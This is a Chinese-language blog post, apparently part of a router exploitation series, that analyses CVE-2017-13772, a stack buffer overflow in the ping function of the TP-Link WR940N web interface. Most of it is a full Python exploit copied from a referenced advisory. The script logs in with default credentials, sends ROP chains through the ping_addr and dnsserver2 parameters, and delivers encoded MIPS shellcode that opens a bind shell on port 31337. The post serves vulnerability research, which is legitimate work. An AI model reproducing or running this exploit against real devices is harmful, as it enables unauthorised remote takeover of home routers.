---
title: 一步一步pwn路由器之wr940栈溢出漏洞分析与利用
authorId: hac425
tags:
  - CVE-2017-13772
  - 路由器实战
categories:
  - 路由器安全
date: 2017-10-29 22:20:00
---
### 前言


---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274/

---

这个是最近爆出来的漏洞，漏洞编号：[CVE-2017-13772](https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/)


固件链接：http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip


之前使用 `firmadyn` 可以正常模拟运行，但是调试不了，就没有仔细看这个漏洞。今天突然想起 他会启动一个 `ssh` 服务，那我们是不是就可以通过`ssh` 连上去进行调试，正想试试，又不能正常模拟了。。。。。下面看具体漏洞。

### 正文


漏洞位与 管理员用来 	`ping` 的功能，程序在获取`ip` 地址时没有验证长度，然后复制到栈上，造成栈溢出。搜索关键字符串 `ping_addr` 定位到函数 `sub_453C50`


![paste image](http://oy9h5q2k4.bkt.clouddn.com/15092873431355nyiesez.png?imageslim)
获取 `ip` 地址后，把字符串指针放到 `$s6`寄存器，跟下去看看。
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509287498785ykojz8u0.png?imageslim)


传入了`ipAddrDispose`函数，继续分析之：



![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509287595268qwyfsd2y.png?imageslim)
先调用了 `memset`  初始化缓冲区，然后调用 `strcpy` 把 `ip` 地址复制到栈上，溢出。


利用的话和前文是一样的，经典的栈溢出，经典的 rop。

[一步一步pwn路由器之rop技术实战](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html)


[一步一步pwn路由器之路由器环境修复&&rop技术分析](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html)


附上参考链接里的 `exp`

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2
import base64
import hashlib
from optparse import *
import sys
import urllib

banner = (
"___________________________________________________________________________\n"
"WR940N Authenticated Remote Code Exploit\n"
"This exploit will open a bind shell on the remote target\n"
"The port is 31337, you can change that in the code if you wish\n"
"This exploit requires authentication, if you know the creds, then\n"
"use the -u -p options, otherwise default is admin:admin\n"
"___________________________________________________________________________"
)

def login(ip, user, pwd):
	print "[+] Attempting to login to http://%s %s:%s"%(ip,user,pwd)
	#### Generate the auth cookie of the form b64enc('admin:' + md5('admin'))
	hash = hashlib.md5()
	hash.update(pwd)
	auth_string = "%s:%s" %(user, hash.hexdigest())
	encoded_string = base64.b64encode(auth_string)

	print "[+] Encoded authorisation: %s" %encoded_string#### Send the request
	url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
	print "[+] sending login to " + url
	req = urllib2.Request(url)
	req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
	resp = urllib2.urlopen(req)
	#### The server generates a random path for further requests, grab that here
	data = resp.read()
	next_url = "http://%s/%s/userRpm/" %(ip, data.split("/")[3])
	print "[+] Got random path for next stage, url is now %s" %next_url
	return (next_url, encoded_string)

#custom bind shell shellcode with very simple xor encoder
#followed by a sleep syscall to flush cash before running
#bad chars = 0x20, 0x00
shellcode = (
#encoder
"\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99"
"\x27\xb2\x05\x4b" #0x27b2059f for first_exploit
"\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9"
"\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41"
"\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d"
"\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71"
"\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d"
"\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99"
"\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5"
"\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad"
"\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9"
"\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1"
"\x02\x2a\x18\x26\xae\x43\xff\xc1"

#sleep
"\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08"
"\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
"\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c"

################ encoded shellcode ###############
"\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06"
"\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff"
"\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d"
"\x7a\x69"            #<————————- PORT 0x7a69 (31337)
"\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad"
"\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc"
"\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01"
"\x01\x0c\x24\x0f\x73\x50"
"\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f"
"\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48"
"\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f"
"\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50"
"\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f"
"\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c"
"\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce"
"\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8"
"\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02"
"\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
"\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c"
)

###### useful gadgets #######
nop = "\x22\x51\x44\x44"
gadg_1 = "\x2A\xB3\x7C\x60"  # set $a0 = 1, and jmp $s1
gadg_2 = "\x2A\xB1\x78\x40"
sleep_addr = "\x2a\xb3\x50\x90"
stack_gadg = "\x2A\xAF\x84\xC0"
call_code = "\x2A\xB2\xDC\xF0"

def first_exploit(url, auth):
	#          trash $s1        $ra
	rop = "A"*164 + gadg_2  + gadg_1 + "B"*0x20 + sleep_addr + "C"*4
	rop += "C"*0x1c + call_code + "D"*4 + stack_gadg + nop*0x20 + shellcode

	params = {'ping_addr': rop, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}

	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)

	print "[+] sending exploit…"
	print "[+] Wait a couple of seconds before connecting"
	print "[+] When you are finished do http -r to reset the http service"

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")

	resp = urllib2.urlopen(req)

def second_exploit(url, auth):
	url = url + "WanStaticIpV6CfgRpm.htm?"
	#                 trash      s0      s1      s2       s3     s4      ret     shellcode
	payload = "A"*111 + "B"*4 + gadg_2 + "D"*4 + "E"*4 + "F"*4 + gadg_1 + "a"*0x1c
	payload += "A"*4 + sleep_addr + "C"*0x20 + call_code + "E"*4
	payload += stack_gadg + "A"*4 +  nop*10 + shellcode + "B"*7
	print len(payload)

	params = {'ipv6Enable': 'on', 'wantype': '2', 'ipType': '2', 'mtu': '1480', 'dnsType': '1',
	'dnsserver2': payload, 'ipAssignType': '0', 'ipStart': '1000',
	'ipEnd': '2000', 'time': '86400', 'ipPrefixType': '0', 'staticPrefix': 'AAAA',
	'staticPrefixLength': '64', 'Save': 'Save', 'RenewIp': '1'}

	new_url = url + urllib.urlencode(params)

	print "[+] sending exploit…"
	print "[+] Wait a couple of seconds before connecting"
	print "[+] When you are finished do http -r to reset the http service"

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "WanStaticIpV6CfgRpm.htm")

	resp = urllib2.urlopen(req)

if __name__ == '__main__':
	print banner
	username = "admin"
	password = "admin"

	(next_url, encoded_string) = login("192.168.0.1", username, password)

	###### Both exploits result in the same bind shell ######
	#first_exploit(data[0], data[1])
	first_exploit(next_url, encoded_string)


```

参考链接：

https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/